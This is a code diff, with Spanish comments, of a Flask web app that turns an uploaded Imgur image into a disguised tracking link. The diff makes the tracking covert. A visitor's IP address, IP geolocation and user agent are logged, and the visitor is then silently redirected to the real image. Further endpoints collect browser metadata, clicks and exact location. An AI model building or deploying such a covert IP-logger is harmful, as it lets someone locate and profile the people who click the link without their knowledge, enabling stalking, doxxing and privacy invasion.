@@ -1,22 +1,12 @@
 import os
 import requests
 import logging
-from flask import Flask, render_template, request, jsonify
+import random
+import string
+from flask import Flask, render_template, request, jsonify, redirect
 from flask_talisman import Talisman
 from datetime import datetime
 from dotenv import load_dotenv
-from pathlib import Path
-
-# Función para crear un archivo .env vacío si no existe
-def check_and_create_env():
-    if not Path('.env').is_file():
-        with open('.env', 'w') as env_file:
-            env_file.write("API_KEY_IPSTACK=\nIMGUR_CLIENT_ID=\n")
-        print(".env file not found. A new .env file has been created. Please add your API keys.")
-        exit(1)
-
-# Verificar que el archivo .env exista, si no lo crea
-check_and_create_env()
 
 # Cargar las variables de entorno desde el archivo .env
 load_dotenv()
@@ -38,12 +28,22 @@ app = Flask(__name__)
 # Protección de seguridad con Talisman
 talisman = Talisman(app)
 
+# Diccionario para almacenar los enlaces de seguimiento
+tracking_data = {}
+
 # Extensiones permitidas para la subida de imágenes
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
 
 # Validar que el archivo tenga una extensión permitida
 def allowed_file(filename):
     return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+# Generar un ID único para el usuario
+def generate_tracking_url(image_link):
+    user_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    tracking_url = f"http://127.0.0.1:5000/track/{user_id}"
+    tracking_data[user_id] = image_link
+    return tracking_url
 
 # Página de inicio con el formulario
 @app.route('/')
@@ -69,7 +69,9 @@ def upload_image():
 
         if response.status_code == 200:
             data = response.json()
-            return f"Enlace de la imagen: {data['data']['link']}"
+            image_link = data['data']['link']
+            tracking_url = generate_tracking_url(image_link)
+            return f"Enlace de seguimiento: {tracking_url}"
         else:
             error_msg = response.json().get('data', {}).get('error', 'Error desconocido')
             return f"Error al subir la imagen a Imgur: {error_msg}"
@@ -88,15 +90,16 @@ def track_user(user_id):
     location = get_geolocation(visitor_ip)
     if location:
         save_visitor_data(visitor_ip, location, user_agent)
-        return jsonify({'ip': visitor_ip, 'location': location, 'user_agent': user_agent})
-    else:
-        return jsonify({'error': 'Error al obtener la geolocalización'}), 500
-    
+
+    # Redirigir al enlace original de la imagen subida
+    image_link = tracking_data.get(user_id, "https://www.example.com")
+    return redirect(image_link)
+
 # Función para obtener la geolocalización mediante IP
 def get_geolocation(ip):
     try:
         url = f"http://api.ipstack.com/{ip}?access_key={API_KEY_IPSTACK}"
-        response = requests.get(url)   
+        response = requests.get(url)
 
         if response.status_code == 200:
             return response.json()
@@ -116,22 +119,22 @@ def save_visitor_data(ip, location, user_agent):
         'date': str(datetime.now())
     }
     logging.info(f"Datos del visitante guardados: {data}")
-        
-# Ruta para recibir los metadatos del navegador
+
+# Función para recibir metadatos
 @app.route('/save_metadata', methods=['POST'])
 def save_metadata():
     data = request.json
     logging.info(f"Metadatos del navegador: {data}") 
     return jsonify({"status": "Metadatos guardados"}), 200
-    
-# Ruta para recibir los eventos de clic
+
+# Función para registrar clics
 @app.route('/track_click', methods=['POST'])
 def track_click():
     data = request.json
     logging.info(f"Click registrado: {data}")
     return jsonify({"status": "Click guardado"}), 200
-            
-# Ruta para recibir la ubicación exacta
+
+# Función para guardar ubicación exacta
 @app.route('/save_location', methods=['POST'])
 def save_location():
     data = request.json
